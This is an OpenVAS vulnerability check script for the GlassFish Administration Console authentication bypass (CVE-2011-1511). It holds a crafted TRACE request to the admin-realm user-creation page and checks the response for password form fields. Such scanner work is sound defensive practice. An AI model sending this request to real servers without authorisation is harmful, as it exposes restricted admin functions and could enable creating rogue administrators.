###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_glassfish_admin_console_auth_bypass_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Oracle GlassFish Server Administration Console Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow local attackers to access sensitive data
  on the server without being authenticated, by making 'TRACE' requests against
  the Administration Console.
  Impact Level: System/Application";
tag_affected = "Oracle GlassFish version 3.0.1 and prior.";
tag_insight = "The flaw is due to an error in Administration Console, when handling
  HTTP requests using the 'TRACE' method. A remote unauthenticated attacker can
  get access to the content of restricted pages in the Administration Console.
  and also attacker can create a new Glassfish administrator.";
tag_solution = "Upgrade to Oracle GlassFish 3.1 or later,
  For updated refer, http://glassfish.java.net/downloads/3.1-final.html";
tag_summary = "The host is running Oracle GlassFish Server and is prone to
  security bypass vulnerability.";

if(description)
{
  script_id(802411);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-1511");
  script_bugtraq_id(47818);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-06 14:03:19 +0530 (Fri, 06 Jan 2012)");
  script_name("Oracle GlassFish Server Administration Console Authentication Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://securityreason.com/securityalert/8254");
  script_xref(name : "URL" , value : "http://www.us-cert.gov/cas/techalerts/TA11-201A.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108381/NGS00106.txt");

  script_description(desc);
  script_summary("Check for security bypass vulnerability in Oracle Java GlassFish Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check for the default port
if(!port = get_http_port(default:4848)){
  port = 4848;
}

## Check port status
if(!get_port_state(port)){
  exit(0);
}

sndReq = http_get(item:"/", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:0);

## Confirm the server
if("Sun Java System Application Server" ><  rcvRes || "GlassFish Server" >< rcvRes)
{

  ## Construct the attack (TRACE) request
  req = string("TRACE /common/security/realms/manageUserNew.jsf" +
               "?name=admin-realm&configName=server-config&bare" +
               "=true HTTP/1.1\r\n",
               "Host: ", get_host_name(), "\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  ## Check the Response
  if("ConfirmPassword" >< res && "newPasswordProp:NewPassword" >< res
      && "405 TRACE method is not allowed" >!< res){
    security_hole(port);
  }
}
